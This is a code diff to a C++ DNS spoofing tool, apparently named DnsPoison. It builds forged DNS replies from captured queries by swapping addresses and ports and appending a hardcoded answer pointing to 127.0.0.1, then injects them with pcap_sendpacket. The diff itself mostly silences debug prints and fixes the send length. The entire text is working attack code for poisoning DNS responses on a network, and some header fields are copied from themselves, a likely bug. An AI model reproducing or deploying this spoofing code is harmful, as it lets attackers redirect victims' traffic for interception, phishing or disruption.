@@ -58,12 +58,12 @@ void DnsPoison::fill_dns_packet(uint8_t* dnsspoofpacket, const uint8_t *packet){
 	UdpHeader *udp2 = (UdpHeader *)(dnsspoofpacket + sizeof(EthHeader) + sizeof(IpHeader));
 	DnsAnswer *dnsa2 = (DnsAnswer *)(dnsspoofpacket + sizeof(EthHeader) + sizeof(IpHeader) + sizeof(UdpHeader));
 
-	print_payload(dnsspoofpacket, 100);
+	//print_payload(dnsspoofpacket, 100);
 
 	memcpy(eth2->dest, eth1->src, 6);
 	memcpy(eth2->src, eth1->dest, 6);
 
-	print_payload(dnsspoofpacket, 100);
+	//print_payload(dnsspoofpacket, 100);
 
 	eth2->ethertype = eth1->ethertype;
 	ip2->ihl = ip1->ihl;
@@ -74,11 +74,11 @@ void DnsPoison::fill_dns_packet(uint8_t* dnsspoofpacket, const uint8_t *packet){
 	ip2->ttl=  ip2->ttl ;
 	ip2->proto=ip2->proto ;
 	ip2->csum = ip2->csum;
-	print_payload(dnsspoofpacket, 100);
+	//print_payload(dnsspoofpacket, 100);
 
 	memcpy(ip2->dest, ip1->src, 4);
 	memcpy(ip2->src, ip1->dest, 4);
-	print_payload(dnsspoofpacket, 100);
+	//print_payload(dnsspoofpacket, 100);
 	memcpy(udp2->destprt, udp1->srcprt, 2);
 	memcpy(udp2->srcprt, udp1->destprt, 2);
 
@@ -90,7 +90,6 @@ void DnsPoison::fill_dns_packet(uint8_t* dnsspoofpacket, const uint8_t *packet){
 	int ql = strlen(dnsa1->query);
 	memcpy(dnsa2->queryandanswer, dnsa1->query, ql);
 	memcpy((dnsa2->queryandanswer) + ql, "\x00\x01\x00\x01\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x08\x00\x04\x7F\x00\x00\x01", 20);
-	print_payload(dnsspoofpacket, 100);
 }
 void DnsPoison::dothepoisoning(const uint8_t *packet,DnsRequest* check)
 {
@@ -122,9 +121,12 @@ void DnsPoison::dothepoisoning(const uint8_t *packet,DnsRequest* check)
 	}
 	uint8_t dnsspoofpacket[100];
 	fill_dns_packet(dnsspoofpacket, packet);
-	print_payload(packet, 100);
-	print_payload(dnsspoofpacket, 100);
-	if (pcap_sendpacket(handle1, (const u_char*)dnsspoofpacket, sizeof(dnsspoofpacket)) != 0) {
+
+	printf("print query\n");
+	print_payload(packet, 74);
+	printf("print answer\n");
+	print_payload(dnsspoofpacket, 74 + 20);
+	if (pcap_sendpacket(handle1, (const u_char*)dnsspoofpacket, 74+20) != 0) {
 				//fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap));
 				return;
 	}
